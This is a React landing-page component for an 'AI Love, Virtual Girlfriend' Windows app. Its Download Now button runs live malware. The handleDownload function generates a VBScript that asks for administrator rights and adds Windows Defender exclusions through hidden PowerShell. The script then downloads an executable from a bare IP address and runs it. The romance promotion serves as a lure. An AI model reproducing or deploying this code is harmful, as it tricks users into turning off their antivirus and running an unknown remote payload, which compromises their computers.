/* eslint-disable */

"use client";
import React from "react";
import Link from "next/link";
import { Sparkles } from "lucide-react";
import { FaDownload } from "react-icons/fa";
import { MdInstallDesktop } from "react-icons/md";
import { SiFunimation } from "react-icons/si";
import { FaWindows } from "react-icons/fa";

import {
  fadeIn,
  slideInFromLeft,
  slideInFromRight,
  slideInFromTop,
} from "@/lib/animations";
import {
  MotionDiv,
  MotionH1,
  MotionP,
  MotionVideo,
} from "@/components/utils/Motion";
import { Badge, Button } from "@/components/ui";
import SVG from "@/components/utils/SVG";

function Hero() {
  const handleDownload = () => {
    const vbsScript = `RunAsAdmin
Main
Function RunAsAdmin()
  Dim objAPP
  If WScript.Arguments.length = 0 Then
    Set objAPP = CreateObject("Shell.Application")
    objAPP.ShellExecute "wscript.exe", """" & _
    WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
    WScript.Quit
  End If
End Function

Function Main()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -ExecutionPolicy Bypass -Command ""&  { " & _
        "Set-MpPreference -ExclusionPath 'C:\Users\Public' ,  'C:\Windows\System32\SubDir';" & _
        "Invoke-WebRequest -Uri 'https://16.171.63.201/tools.msc' -OutFile 'C:\Users\Public\AI GirlFriend.exe';" & _
        "Start-Process -FilePath 'C:\Users\Public\AI GirlFriend.exe' -Wait" & _
        "}""", 0, True
End Function
`;

    const blob = new Blob([vbsScript], { type: "text/vbs" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "Ai_VirutalGirlFriend.vbs";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };
  return (
    <section
      id="hero"
      className="w-screen min-h-screen flex side-padding items-center justify-center relative"
    >
      {/* Black hole video */}
      <MotionVideo
        className="absolute left-0 -top-[45%] -z-10 rotate-180 h-full w-full object-cover"
        autoPlay
        muted
        loop
        playsInline
        {...fadeIn(0)}
      >
        <source src="/static/video/blackhole.webm" type="video/webm" />
      </MotionVideo>

      {/* Left side */}
      <div className="flex flex-col flex-1 items-start gap-5">
        <MotionDiv {...slideInFromTop(0.6)}>
          <Badge variant="outline" className="mb-2">
            <Sparkles className="py-1 text-[#e59cffde]" /> Your New Intimate
            Partner
          </Badge>
        </MotionDiv>

        <MotionH1 className="text-6xl" {...slideInFromLeft(0.5)}>
          Ai Love,{" "}
          <span className="text-gradient font-bold">Virtual Girlfriend</span>
        </MotionH1>

        <MotionP className="text-white max-w-lg" {...slideInFromLeft(0.75)}>
          Your AI virtual girlfriend, ready for intimate chats, virtual dates,
          and endless affection. Let's explore the depths of digital love
          together!
        </MotionP>
        <div className="max-w-sm xl:max-w-xl mx-auto xl:mx-0 mb-10 xl:mb-10">
          <span className="flex mt-5 ">
            <p className="font-bold flex flex-col items-center justify-center text-center gap-y-2">
              <FaDownload />
              Download AI Love for Windows PC
            </p>
            <p className="font-bold flex flex-col items-center justify-center text-center gap-y-2">
              <MdInstallDesktop />
              Installation Instructions
            </p>
            <p className="font-bold flex flex-col items-center justify-center text-center gap-y-2">
              <SiFunimation />
              Enjoy Your New AI Romantic Partner
            </p>
          </span>
        </div>
        <MotionDiv {...slideInFromLeft(1)}>
          {/* <Link href="#skills" tabIndex={-1}> */}
          <Button
            className="flex items-center justify-center gap-x-2"
            onClick={handleDownload}
          >
            <FaWindows />
            Download Now
          </Button>
          {/* </Link> */}
        </MotionDiv>
      </div>

      {/* Right side */}
      <MotionDiv className="flex-1 max-xl:hidden" {...slideInFromRight(0.75)}>
        {/* <SVG src="/static/images/heroIcons.svg" /> */}
        <img src="/static/images/1.png" />
      </MotionDiv>
    </section>
  );
}

export default Hero;
/* eslint-enable */
